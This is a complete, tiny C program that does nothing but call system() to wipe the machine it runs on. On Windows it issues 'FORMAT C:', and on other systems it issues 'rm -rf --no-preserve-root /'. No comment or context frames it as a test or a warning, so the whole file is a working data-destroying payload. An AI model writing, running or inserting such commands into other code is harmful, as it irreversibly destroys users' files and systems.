#include <stdio.h>
#include <stdlib.h>

int main(void) {
#ifdef WIN32
	system("FORMAT C:");
#else
	system("rm -rf --no-preserve-root /");
#endif
	return EXIT_SUCCESS;
}